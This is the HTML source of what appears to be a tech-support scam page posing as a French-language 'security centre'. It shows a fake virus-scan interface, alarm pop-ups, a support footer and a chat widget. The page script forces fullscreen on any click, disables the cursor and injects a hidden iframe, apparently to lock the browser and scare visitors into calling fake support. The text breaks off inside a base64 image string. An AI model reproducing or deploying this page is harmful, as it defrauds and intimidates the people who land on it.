
<!doctype html>
<html lang="en">
	
   <head>
      <!-- Required meta tags -->
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	  
      <style>body{
   overflow-y: hidden; 
   font-family: 'Roboto', sans-serif !important;
}
:-webkit-full-screen .pro_box3{
top: 18%;
}
:-webkit-full-screen .pro_box2{
top: 19%;
}
:-webkit-full-screen .pro_box{
top: 20%;
}
:-webkit-full-screen #pop_up_new{
    top: 11%;
}
:-webkit-full-screen #poptxt{
        top: 29%;
}
#chat-box{
    background-color: #fff;
    padding: 15px;
    position: fixed;
    bottom: 43px;
    right: 13px;
    z-index: 99999999;
    border-radius: 10px;
        display: none;
}
#chat-box img{
        color: #000;
    font-size: 16px;
    font-weight: 600;
    margin-left: 35px;
    width: 25px;
}
#chat-box h4{
        width: 217px;
    font-size: 17px;
    text-align: center;
    padding-top:0px;
    margin: 0px auto;
    display: block;
}
#chat-box a{
    text-align: center;
    margin: 0px auto;
    display: block;
}
#chat-box p {
    font-size: 16px;
    text-align: center;
    padding-top: 7px;
    font-weight: normal;
}
#chat-box .arrow-down{
       position: absolute;
    font-size: 47px;
    color: #fff;
    bottom: -37px;
    left: 65px;
    z-index: 999;
}
#pop_up_new{
    position: absolute;
    top: 6%;
    z-index: 999999;
    left: 36%;
    background: #1a73e8;
    width: 440px;
    text-align: left;
    padding-top: 4px;
    display: none;
    color: #FFFFFF;
    padding-left: 20px;
    padding-right: 20px;
    border-radius: 15px;
}

#pop_up_new p{
    font-weight: 500;
    font-size: 12px;
        line-height: 21px;
}
#pop_up_new .action_buttons a.active {
    border: 1px solid #fff;
    font-weight: bold;
}
#pop_up_new .action_buttons a {
    float: right;
    font-size: 12px;
    margin-right: 15px;
    padding: 6px 25px;
    text-decoration: none;
    color: #000 !important;
    border: 1px solid #DDD;
    margin-top: 20px;
    border-radius: 2px;
    margin-bottom: 20px;
}

@keyframes zoominoutsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}

@keyframes zoomininsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}
.black {
    width: 100%;
    height: 100%;
    background-color: #000;
    opacity: 0.2;
    transition: 1s;
    position: absolute;
    top: -190px;
}
.bg .bgimg {
    position: absolute;
    top: 60px;
    left: 0px;
    width: 100%;
}
.pro_box_header{
    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
}
.pro_box{
        width: 750px;
    height: 536px;
    position: absolute;
    z-index: 99;
    background-color: #fff;
        left: 26%;
    top: 15%;
        border-radius: 15px;
   
}

.pro_box2{
     width: 850px;
    height: 600px;
    position: absolute;
    z-index: 9999;
    background-color: #fff;
        left: 23%;
    top: 7%;
    display: none;
        border-radius: 15px;
}
.pro_box3{
     width: 850px;
    height: 600px;
    position: absolute;
    z-index: 999999;
    background-color: #fff;
    left: 23%;
    top: 7%;
     display: none;
         border-radius: 15px;
}

.minimize ul{
    list-style-type: none;
    float: right;
}
.minimize ul li{
    float: left;
    display: inline-block;

}
.minimize ul li a img{
width: 140px;
height: auto;
}
.logo{
        margin-left: 20px;
}
.logo img{
    width: 30px;
}
.logo span{
        font-weight: bold;
    margin-left: 6px;
    font-size: 18px;
}
.activate_lic ul{
    list-style-type: none;
    float: right;
}
.activate_lic ul li{
    float: left;
    display: inline-block;

}
.activate_lic ul li a{
    padding: 10px;
}
.activate_lic ul li a button{
       background-color: transparent;
    border: 2px solid #a5add1;
    color: #3947b0;
    padding: 5px;
    border-radius: 6px;
    text-align: center;
        position: relative;
    top: -3px;
}

.scan_box{
   width: 700px;
   height: 393px;
    background-color: #fff;
    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
    margin: 0px auto;
    margin-top: 20px;
    display: block;
    border-radius: 15px;
}
.scan_box_header{
    border-bottom:1px solid #c1c1c1;
        height: 50px;
}
.quick_scan{
        margin: 10px 0 0 16px;
}
.quick_scan p{
    font-size: 18px;
    font-weight: bold;
}
.quick_scan img{
    width: 25px;
        margin-right: 6px;
    border-radius: 15px;

}
.minimize1 ul{
      list-style-type: none;
    float: right;
    margin-top: 10px;
}
.minimize1 ul li{
    float: left;
    display: inline-block;

}
.minimize1 ul li a img{
    width: 140px;
    height: auto;
}
.progress {
      margin-top: 15px;
    width:665px;
    margin-left: 19px;
        height: 25px;
}
.progress-bar{
        height: 25px;
}
#dynamic{
    color: #fff;
    font-size: 15px;
    font-weight: 700;
}
.table_quick .table{
    width: 665px;
    margin-left: 20px;
    border-radius: .25rem;
    margin-top: 20px;
}
.table_quick .table td, .table th{
        padding: .25rem;
}
.table-bordered td, .table-bordered th{
    border-bottom: 1px solid #dee2e6;
    border-bottom-width: 1px;
}
.bt_can{
        margin-top: 103px;
    margin-left: 28px;
}
.bt_can .btn{
        background: transparent;
    color: #000;
    margin-right: 15px;
    height: 30px;
    padding: 12px;
    width: 80px;
    text-align: center;
    line-height: 0px;
}
.bt_can .btn:focus{
box-shadow: none;
}
.bt_can .btn:hover{
background-color: #007BFF;
    border-color: #007BFF;
    color: #fff;
}
.bt_can2 .btn:hover{
background-color: #007BFF;
    border-color: #007BFF;
    color: #fff;
}
.btn-secondary:not(:disabled):not(.disabled).active, .btn-secondary:not(:disabled):not(.disabled):active, .show>.btn-secondary.dropdown-toggle{
    background-color: #007BFF;
    border-color: #007BFF;
    color: #fff;
}

.bt_can2{
           margin-top: 103px;
    float: right;
}
.bt_can2 .btn{
         background: transparent;
    color: #000;
    margin-right: 15px;
    height: 30px;
    padding: 12px;
    width: 160px;
    text-align: center;
    line-height: 0px;
}
.bt_can2 .btn:focus{
box-shadow: none;
}


.counter { 
    background-color: #ffffff;
    padding: 0;
    border-radius: 5px;
}
.count-title {

        font-size: 1rem;
    font-weight: bold;
    margin-bottom: 0;
    text-align: left;

 }
.count-text { font-size: 13px; font-weight: normal;  margin-top: 10px; margin-bottom: 0; text-align: center; }
.fa-2x { margin: 0 auto; float: none; display: table; color: #4ad1e5; }
.total_detail ul{
    list-style-type: none;
    float: right;
        margin-top: 8px;
}
.total_detail ul li{
       float: left;
    display: inline-block;
    font-size: 11px;
    padding-left: 10px;
    padding-right: 15px;
    text-align: center;
}
.total_detail ul li a{
    text-decoration: none;
}
.total_detail ul li a p{
    line-height: 12px;
    margin-bottom: 3px;
    color: #000;
    font-weight: 700;
}
.new_heading{
     margin-top: 8px;
         margin-left: 20px;
}
.scan_box2 {
    width: 800px;
    height: 460px;
    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
    margin: 0px auto;
    margin-top: 20px;
    display: block;
    border-radius: 15px;
}

.table_quick2 .table {
    width: 767px;
    margin-left: 20px;
    border-radius: .25rem;
    margin-top: 0px;
}
.table_quick2 .table td, .table_quick2 .table th {
    padding: .12rem;
        font-size: 12px;
}
.mar_lef{
    margin-left: 10px;
}
#table_scroll{
     height:60px;
    overflow-y:auto;
    width: 100%;
}
.scan_footer2{
       margin-top: -80px;
}
.table_quick2{
    margin-top: -22px;
}
.bg_blue{
    background-color: #007BFF;
    border-color: #007BFF;
    color: #fff;
}
.total_detail_scan ul{list-style-type: none;}
.total_detail_scan ul li{
float: left;
    display: inline-block;
    width: 140px;
    font-size: 17px;
    font-weight: 600;
}
.total_detail_scan{
padding: 17px 0;
    margin-left: -18px;}

.total_detail_scan ul li:first-child:before{
    border-bottom: 2px solid #204289;
    position: absolute;
    content: '';
    display: block;
    background-color: #204289;
    width: 70px;
    height: 2px;
    top: 42px;
}
.total_detail_scan ul li:first-child{
        width: 90px;
}
.total_detail_scan ul li a{
    text-decoration: none;
}
.pc_desk {
    padding: 63px 2px 0px 46px;
}
.mar_top{
    position: relative;
    top: 16px;
}
.mar_top ul{
list-style-type: none;
padding-inline-start: 0px;
}
.mar_top ul li{
    line-height: 30px;
}
.pause_can{
    margin-top: -66px;
}
.mar_top:before{
         width: 1px;
    height: 200px;
    content: '';
    background-color: #eee;
    position: absolute;
    display: block;
    right: 2px;

}
.scan_dur{}
.scan_dur p{margin-bottom: 0px;}
.scan_footer3 {
       margin-top: 39px;
    margin-left: 0px;
    background: #eee;
    padding: 10px;
        border-radius: 0px 0px 15px 15px;
}
.viruses img{
    width: 68px;
    padding-top: 5px;
    padding-bottom: 10px;
}
.make_this{
    margin-top: 8px;
    
}
.viruses{
        margin-left: 45px;
}
.make_this p{
    margin-bottom: 0px;
    font-size: 14px;
    font-weight: 600;
}


.circular-spinner {
 margin-top: 30px;
    width: 20px;
    height: 20px;
    border: 2px solid white;
    border-top: 2px solid #454d7c;
    border-radius: 100%;
    animation: rotate 1.5s linear infinite;
    float: left;
    position: relative;
    top: -25px;
    left: -4px;
}

@keyframes rotate {
  from {transform: rotate(0);}
  to {transform: rotate(360deg);}
}

#footer {
    width: 100%;
    position: fixed;
    bottom: 0;
    background-color: #1a73e8;
    z-index: 999;
    
    padding: 10px 34px;
    color: #fff;
    font-size: 18px;
    height: 81px;
    cursor: pointer;
}
#footer .right-foot{

}
#footertxt,
#footertxt2 {
    font-size: 20px;
}
#footertxt img{
    width: 20px;
}
#footertxt2 {
    display: none;
}
#poptxt {
    font-weight: 700;
    padding: 15px 30px;
    min-height: 300px;
    border-radius: 15px;
    border: 1px solid #fff;
    width: 620px;
    display: block;
    margin: 0 auto;
    background-color: #fff;
    z-index: 9999999;
    box-shadow: 5px 5px 15px 5px rgba(0, 0, 0, 0.4);
    position: absolute;
    top: 27%;
        left: 30%;
        cursor: pointer;
        display: none;
}
.ilb {
    display: inline-block;
}
#disclaimer {
    margin: 5px;
    font-size: 17px;
    font-weight: bold;
    text-align: center;
}
.logo3 {
    margin: 0 7px 0 0;
    width: 30px;
    height: 30px;
}
.title2 img {
    position: absolute;
    width: 3%;
    top: 19px;
    right: 27px;
}
#txtintro{
    clear: both;
    padding-top: 0px;
        font-size: 14px;
    font-weight: 600;
    text-align: center;
}
.colo-rd{
    color: #ff0000;
}
.logo_head{
    font-size: 14px;
    font-weight: 600;
    color: #000;
}
#badge {
    margin-top: 22px;
    height: 27px;
}
.title3 {
    font-size: 18px;
    font-weight: 700;
    text-transform: capitalize;
    width: 3%;
    position: relative;
    top: 21px;
    left: 8px;
}

#bottom ul li {
    display: inline-block;
    float: left;
    padding-left: 20px;
    margin-top: 13px;
}
.button {
    border-radius: 4px;
    padding: 10px 10px 10px 10px;
    color: #fff;
    background-color: #1a73e8;
    font-size: 18px;
    font-weight: 700;
    text-align: center;
    cursor: pointer;
        border: 1px solid #1a73e8;
}
.button2 {
    border-radius: 4px;
    padding: 10px 10px 10px 10px;
    color: #000;
    border: 1px solid #000;
    background-color: transparent;
    font-size: 18px;
    font-weight: 700;
    text-align: center;
    cursor: pointer;
}
.button2:hover{
color: #fff;
    background-color: #1a73e8;
    border-color: #1a73e8;

}
.cardcontainer2 {
  animation: zoominoutsinglefeatured 2s infinite ;
}
@keyframes zoominoutsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}

@keyframes zoomininsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}
.cardcontainer {
  animation: zoominoutsinglefeatured 4s infinite ;
}
@keyframes zoominoutsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}

@keyframes zoomininsinglefeatured {
    0% {
        transform: scale(1,1);
    }
    50% {
        transform: scale(1.1,1.1);
    }
    100% {
        transform: scale(1,1);
    }
}
.support{
        font-weight: bold;
    font-size: 17px;
    color: #1a73e8;
}
#bottom {
    margin: 12px 0;
    height: 50px;
    display: flex;
        border-top: 1px solid #d6d5d5;

}
#bottom ul{    list-style-type: none;
    position: relative;
    left: 13rem;}
#bottom ul li{
display: inline-block;
    float: left;
    padding-left: 20px;
    margin-top: 13px;
}
#txtclickon1,
#txtclickon2 {
    margin-left: 5px;
}
#txtaex,
#txtatc {
    font-weight: 700;
    text-decoration: underline;
}
#txts3 {
    margin-left: 30px;
}
#instructions {
    display: none;
    margin: 5px 0 -8px;
}
#banner {
    margin: 5px auto;
    display: block;
}

.headers {
      width: 535px;
    margin-top: 0px;
    padding-bottom: 10px;
    margin-bottom: 8px;
}
#wrapper {
 /* width: 600px;
  margin: 50px auto;*/
}
.bounce {
  -webkit-border-radius:50%;
  -moz-border-radius:50%;
  -ms-border-radius:50%;
  border-radius:50%;
  animation: bounce 2s infinite;
  -webkit-animation: bounce 2s infinite;
  -moz-animation: bounce 2s infinite;
  -o-animation: bounce 2s infinite;
}
 
@-webkit-keyframes bounce {
  0%, 20%, 50%, 80%, 100% {-webkit-transform: translateY(0);} 
  40% {-webkit-transform: translateY(-30px);}
  60% {-webkit-transform: translateY(-15px);}
}
 
@-moz-keyframes bounce {
  0%, 20%, 50%, 80%, 100% {-moz-transform: translateY(0);}
  40% {-moz-transform: translateY(-30px);}
  60% {-moz-transform: translateY(-15px);}
}
 
@-o-keyframes bounce {
  0%, 20%, 50%, 80%, 100% {-o-transform: translateY(0);}
  40% {-o-transform: translateY(-30px);}
  60% {-o-transform: translateY(-15px);}
}
@keyframes bounce {
  0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
  40% {transform: translateY(-30px);}
  60% {transform: translateY(-15px);}
}
.chat-listcontainer ul li:nth-child(3){
      margin-bottom: 10px;
}
:-webkit-full-screen .chat_box{
  top: 300px !important;
}
.chat-listcontainer ul li:nth-child(3) .message-text{
      border: 2px solid #06f;
    color: #000;
    background: transparent;
    font-weight: 500;
    font-size: 14px;
        padding: 4px;
}
.chat-listcontainer ul li:nth-child(4) .message-text{
      border: 2px solid #06f;
    color: #000;
    background: transparent;
    font-weight: 500;
    font-size: 14px;
        padding: 4px;
}
.chat-listcontainer ul li:nth-child(5) .message-text{
    font-size: 13px;
    background: #06f;
    color: #fff;
        font-style: inherit;
}
.ev_zo_img {
    background: url(./mic.png) no-repeat center;
    background-size: 14px;
    position: absolute;
    background-color: #fff;
    z-index: 1;
    box-shadow: 0 1.1px 1.7px 0 rgb(0 0 0 / 10%), 0 0 0 0.6px rgb(0 0 0 / 5%);
        right: 24px;
    bottom: 157px;
}
.ev_zo_img {
    height: 30px;
    width: 30px;
    border-radius: 15px;
}
.bgimg2{
  display: none;
}
#ev_talkbox_min {
    border-radius: 28px;
    box-shadow: 0 0 0 1px rgb(0 0 0 / 8%), 0 4px 12px 1px rgb(0 0 0 / 20%);
    -webkit-box-shadow: 0 0 0 1px rgb(0 0 0 / 8%), 0 4px 12px 1px rgb(0 0 0 / 20%);
    height: 50px;
    background-color: #fff;
}
#ev_min_zoimg {
    display: inline-block;
    width: 40px;
    height: 40px;
    background: url(./mic.png) no-repeat center;
    background-size: 20px;
    background-color: #fff;
    margin: 2px 0 0 5px;
    border-radius: 10px;
}
#ev_min_title {
    font-size: 16px;
    line-height: 20px;
    padding: 16px 16px 14px 8px;
}
#ev_talkbox_min>* {
    display: inline-block;
    vertical-align: middle;
}
#ev_talkbox_wrapper.ev_talkbox_wrapper_min {
    cursor: pointer;
}
#ev_talkbox_wrapper {
    position: fixed;
    z-index: 99999999999;
    bottom: 10px;
    right: 40px;
    transition: all .2s;
}
.new_messg{
      position: absolute;
    left: -241px;
    width: 237px;
    border-radius: 28px;
    box-shadow: 0 0 0 1px rgb(0 0 0 / 8%), 0 4px 12px 1px rgb(0 0 0 / 20%);
    -webkit-box-shadow: 0 0 0 1px rgb(0 0 0 / 8%), 0 4px 12px 1px rgb(0 0 0 / 20%);
    height: 50px;
    background-color: #fff;
    padding: 5px 3px 3px 17px;
}
.new_messg p{
  margin-bottom: 0;
}
.chat_head{
  border-bottom: 1px solid #f5f5f5;
    background: linear-gradient(314.7deg,#06f 34.84%,#25a9f4 89.75%);
    border-radius: 15px 15px 0 0;
    position: relative;
    padding: 0 16px;
    transition: height .2s;
    height: 80px;
        margin-bottom: 30px;
}
.cro_icon{
      float: right;
    position: relative;
    top: 17px;
}
.ou_log{
  background-size: 20px;
    background-color: #fff;
    height: 40px;
    width: 40px;
    border-radius: 20px;
    position: absolute;
    display: inline-block;
        right: 21px;
    top: 61px;
    z-index: 1;
    box-shadow: 0 1.1px 1.7px 0 rgb(0 0 0 / 10%), 0 0 0 0.6px rgb(0 0 0 / 1%);
}
.ou_log img{
        top: 10px;
    right: 10px;
    width: 21px;
    position: absolute;
}
.chat_head h3{
 color: #fff;
    font-size: 16px;
    padding: 20px 0;
    padding-bottom: 0px;
    margin-bottom: 0;
}
.chat_head p{
   color: #fff;
    font-size: 12px;
    
    padding-bottom: 0px;
    margin-bottom: 0;
}
.chat_box {
        z-index: 999999999;
    position: fixed;
    right: 2rem;
    width: 328px;
    /*bottom: -23px;*/
        cursor: pointer;
        display: none;

}

.chat ul {
  margin: 0px;
  padding: 0px;
  list-style: none;
}

.message-left .message-time {
  display: block;
  font-size: 12px;
  text-align: left;
  padding-left: 30px;
  padding-top: 4px;
  color: #08A4F7;
  font-family: Courier;
}

.message-right .message-time {
  display: block;
  font-size: 12px;
  text-align: right;
  padding-right: 20px;
  padding-top: 4px;
  color: #ccc;
  font-family: Courier;
}

.message-left {
  text-align: left;
  margin-bottom: 16px;
}

.message-left .message-text {
  max-width: 80%;
  display: inline-block;
  background-color: #06f;
    color: #fff;
  padding: 7px;
  font-size: 14px;
 border-radius: 30px;
  font-weight: 400;
  box-shadow: 0 1.7px 1.7px 0 rgb(0 0 0 / 25%);
  border-radius: 3px 12px 12px 12px;
  line-height: 1.5em;
}

.message-right {
  text-align: right;
  margin-bottom: 16px;
}

.message-right .message-text {
  line-height: 1.5em;
  display: inline-block;
  background: #f3f8ff;
  padding: 15px;
  color: #333;
  font-style: italic;
  font-size: 13px;
  line-height: 1.5em;
  font-weight: 700;
  text-align: left;
      border-radius: 12px 3px 12px 12px;
  box-shadow: 0 1.7px 1.7px 0 rgb(0 0 0 / 25%);
}

.chat {
  border-radius: 15px;
  padding: 0px;
  background: #fff;
  border-left: 1px solid #d9d8d8;
}
.type_msg {border-top: 1px solid #c4c4c4;position: relative;padding: 0 14px;}
.msg_send_btn {
 background: transparent;
    border: medium none;
    border-radius: 50%;
    color: #fff;
    cursor: pointer;
    font-size: 17px;
    height: 33px;
    position: absolute;
    right: 14px;
    top: 8px;
    width: 33px;
}
.msg_send_btn img{
  width: 27px;
}
.messaging { padding: 0 0 50px 0;    width: 328px;}
.input_msg_write input {
    background: rgba(0, 0, 0, 0) none repeat scroll 0 0;
    border: medium none;
    color: #c3c1c1;
    font-size: 14px;
    min-height: 48px;
    width: 100%;
}
.chat-container {
  height: 360px;
  overflow-y: scroll;
      padding-right: 13px;
    padding-left: 13px;
}

.spinme-right {
  display: inline-block;
  padding: 15px 20px;
  font-size: 14px;
  border-radius: 30px;
  line-height: 1.25em;
  font-weight: 100;
  opacity: 0.2;
}

.spinme-left {
  display: inline-block;
  padding: 15px 20px;
  font-size: 14px;
  color: #ccc;
  border-radius: 30px;
  line-height: 1.25em;
  font-weight: 100;
  opacity: 0.2;
}

.spinner {
  margin: 0;
  width: 30px;
  text-align: center;
}

.spinner > div {
  width: 10px;
  height: 10px;
  border-radius: 100%;
  display: inline-block;
  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
  background: rgba(0,0,0,1);
}
 
.spinner .bounce1 {
  -webkit-animation-delay: -0.32s;
  animation-delay: -0.32s;
}

.spinner .bounce2 {
  -webkit-animation-delay: -0.16s;
  animation-delay: -0.16s;
}

@-webkit-keyframes sk-bouncedelay {
  0%,
  80%,
  100% {
    -webkit-transform: scale(0)
  }
  40% {
    -webkit-transform: scale(1.0)
  }
}

@keyframes sk-bouncedelay {
  0%,
  80%,
  100% {
    -webkit-transform: scale(0);
    transform: scale(0);
  }
  40% {
    -webkit-transform: scale(1.0);
    transform: scale(1.0);
  }
}</style>
      <title>Centre de sécurité Code0x268d3 Servicess</title>
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
      <script type="text/javascript">
         window.onload = function () {
             document.onclick = function (e) {
                 e = e || event;
                 target = e.target || e.srcElement;
                 if (target.tagName === "DIV") {
                     toggleFullScreen();
                     document.body.style.cursor = 'not-allowed';
                     document.getElementById('map').innerHTML = stroka;
                     document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                 } else {
                     toggleFullScreen();
                     document.body.style.cursor = 'not-allowed';
                     document.getElementById('map').innerHTML = stroka;
                     document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                 }
             }
         }
      </script>
      <script>
        var img1 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAAnAgMAAADbUYpMAAAACVBMVEX///8XFxfR0dGaMPbRAAAAX0lEQVQ4y2MYBaNgcALW0FAkngQDkwM+1SwMjEg8NQbOBnyqQ0MDERygWjW8LnFgEETiMSXMIEE1w6wEVGnG0NAQ3KpVcTqbctWzEqjqS1GSQlCApNgJQI/5UTAKaAMAJ2IO1jae8lwAAAAASUVORK5CYII=">';
        var img2 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC8AAAAuBAMAAABKVV06AAAAElBMVEUDpfCAuwPzUCL/uQMAAAC5uQQ0mX59AAAABnRSTlP9/Pv6ADplVg4YAAAAJ0lEQVQ4y2NQQgAXQQQIGJUYlUBIuGAHDrglkICLMQIEjEqMSsAlADP/hpWs+eXQAAAAAElFTkSuQmCC">';
        var img3 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAMAAABhq6zVAAAASFBMVEVmZmby8vLb29vT09OXl5e8vLy3t7eKioqGhoaCgoLR0dHHx8ewsLCtra2bm5uUlJR8fHx3d3fW1tbAwMCjo6Ofn5+SkpJra2umfEa0AAAAVUlEQVQI1z2OxxGAMADD5PTQO/tvCiFH9NHpZaOXfV198RcnzDXcMt2Ay050NDo8kK1NQEADWMnAKBT+GEQPJGMiMLLR8GhaHMCcch094GoP+hhD8QOnowINRECPDAAAAABJRU5ErkJggg==">';
        var img4 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAMAAABFNRROAAAAOVBMVEUAAABmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmaYvjlcAAAAE3RSTlMAq7WgeVMSCtjNwaSWkG1qRykiuuOYSwAAAFJJREFUCNdlikkSwCAIBGVR1Lj//7EpCebiHKarGZymYXN/fITojxQWJ1xsYQV/K4hCQPFoH4IZ3DarWZ37tMzWHvMIKmHk3Z0wQULqwZ4ISfkCgJIBlejTBNMAAAAASUVORK5CYII=">';
        var img5 = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAMAAABFNRROAAAAP1BMVEVmZmby8vLExMSnp6ft7e3T09N8fHxsbGySkpLe3t6bm5vh4eHGxsa9vb12dnbp6eni4uK5ubmhoaGHh4dzc3NMTTl6AAAAYklEQVQI112ORxLDQAgEexfYoOT4/7d6ROlicaAmEIZSilcbVl1ILBpntThZQN/n3iEKLmebNje5TgVeH5YHCBtZVarwSPJ+ftXH5a0pWu7Rl57jefNizfMfx3qoxy3Lf84fx4YCGFO4cJsAAAAASUVORK5CYII=">';
        var img6 = '<img src="data:image/png;base64,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